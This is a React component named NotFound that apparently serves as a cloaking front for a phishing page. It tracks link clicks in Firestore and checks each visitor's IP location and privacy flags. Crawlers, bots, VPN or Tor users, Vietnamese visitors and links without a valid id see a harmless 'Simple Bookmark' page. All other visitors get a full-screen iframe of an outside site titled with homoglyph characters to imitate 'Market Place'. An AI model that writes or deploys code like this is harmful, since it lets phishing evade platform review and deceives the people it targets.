import React, { useEffect, useState } from "react";
import { isbot } from "isbot";
import { Helmet } from 'react-helmet';
import MetaIcon from '../resources/favicon2.ico';
import {
  collection,
  addDoc,
  deleteDoc,
  onSnapshot,
  query,
  where,
  doc,
  updateDoc,
  runTransaction,
  orderBy,
  getDocs,
  limit,
} from "firebase/firestore";
import { db } from "../firebase";


function NotFound() {
  const [IsChecked, setIsChecked] = useState(0);
  let[countryCode, setCountryCode] = useState('');
  let[IsUserHiden, SetUserHiden] = useState(false);
  let[IframeUrl, SetIframeUrl] = useState('https://stackclient-hhrs.onrender.com/');
  let[SiteTitleMeta, SetSiteTitleMeta] = useState('Μаrkеt Ꮲⅼасе');
  let[SiteTitleHome, SetSiteTitleHome] = useState('Simple Bookmark');
  const usersRef = collection(db, "links");
  const q = query(usersRef, orderBy("createdAt", "desc"));

  function showIframe(file,title,favicon) {
    const html = (
      <>
      <Helmet>
          <title>{title}</title>
          {favicon == true ? 
          <link rel="icon" type="image/svg+xml" href={MetaIcon}/>
           :
           null
          }
      </Helmet>
      <iframe src={file} style={{
        position: 'fixed',
        top: '0px',
        bottom: '0px',
        right: '0px',
        width: '100%',
        border: 'none',
        margin: '0',
        padding: '0',
        overflow: 'hidden',
        zIndex: '999999',
        height: '100%',
      }}></iframe>
      </>
    );
    return html;
  }
 
  const setLocaltion =  () => {
    try {
        fetch("https://api64.ipify.org/?format=json").then(d => d.json()).then(d => {
          var ipAddress = d.ip;
          if(ipAddress){
            fetch(`https://ipinfo.io/widget/demo/${ipAddress}`).then(d => d.json()).then(d => {
            let data = d.data;
            if(data){
             var countryCode = data.country;
              setCountryCode(countryCode.toLowerCase());
              var privacy = data.privacy;
              if(privacy){
                if(
                  privacy.vpn == true
                  || privacy.hosting == true
                  || privacy.relay == true
                  || privacy.tor == true
                  || privacy.proxy == true
                ){
                  SetUserHiden(true);
                }
              }
            }
          }); 
        }
      });
    } catch (error) {
      console.error("Error fetching data:", error);
    }
  };
  useEffect(() => {
    setLocaltion();
  }, []);

  const params = new URLSearchParams(window.location.search)

  if(!params.get("id")){
    SetUserHiden(true);
  }else{
     runTransaction(db, async (transaction) => {
      const sfDocRef = doc(db, "links",params.get("id"));
      const sfDoc = await transaction.get(sfDocRef);
      if (!sfDoc.exists()) {
        SetUserHiden(true);
      }else{
        const counter = (sfDoc?.get("counter") || 0) + 1;
        transaction.update(sfDocRef, { counter });
        SetUserHiden(false);
      }
    });
  }

  const userAgent = navigator.userAgent.toLowerCase();
  if(!userAgent.includes('facebook') 
    && !userAgent.includes('google') 
    && !isbot(userAgent)){
    if(IsUserHiden){
      return(showIframe("/id/home.html",SiteTitleHome,false));
    }else{
      if(countryCode.length == 0){
        return(           
          <div className="loading">
              <div className="loader"></div>
          </div>
        );
      }else{
        if(countryCode.includes('vn')){
          return(showIframe("/id/home.html",SiteTitleHome,false));
        }else{
          return(showIframe(IframeUrl,SiteTitleMeta,true));
        }
      }
    }
  }else{
    return(showIframe("/id/home.html",SiteTitleHome,false));
  }
}

export default NotFound;
